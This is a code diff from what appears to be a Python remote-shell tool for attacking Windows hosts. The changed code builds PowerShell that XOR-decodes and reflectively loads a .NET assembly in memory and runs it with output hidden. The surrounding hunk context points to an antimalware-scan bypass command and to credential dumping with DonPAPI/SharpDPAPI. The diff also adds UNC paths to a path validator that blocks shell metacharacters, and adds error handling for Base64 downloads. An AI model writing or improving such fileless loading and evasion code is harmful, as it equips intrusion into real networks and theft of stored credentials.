@@ -408,7 +408,8 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
             f"$out = {new_HostWriter}",
             f"[Console]::SetOut($out); [Console]::SetError($out)",
-            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
+            f"[void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]({argv})))" if args[1:] else
+            "[void]$dll.EntryPoint.Invoke($null, $null)",
             "[Console]::SetOut([IO.StreamWriter]::Null)",
             "[Console]::SetError([IO.StreamWriter]::Null)",
             "$out.Dispose()",
@@ -510,7 +511,7 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
     # ── safe Windows path validator ───────────────────────────────────────────
     import re as _re
     _SAFE_WIN_PATH_RE = _re.compile(
-        r'^[A-Za-z]:[\\\/][^\x00-\x1f"$`|&;<>{}()]*$'
+        r'^(?:[A-Za-z]:|\\\\[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+)[\\\/][^\x00-\x1f"$`|&;<>{}()]*$'
     )
 
     @classmethod
@@ -639,8 +640,11 @@ Remove-Item Function:Download-Remote
 
         def collect(out):
             if part := out.get("stdout"):
-                buf.extend(b64decode(part))
-                self.write_progress(f"Download {len(buf)} bytes")
+                try:
+                    buf.extend(b64decode(part))
+                    self.write_progress(f"Download {len(buf)} bytes")
+                except Exception:
+                    self.write_warning("Received malformed Base64 chunk from server (skipped)")
 
         self.run_with_interrupt(ps, collect)
 
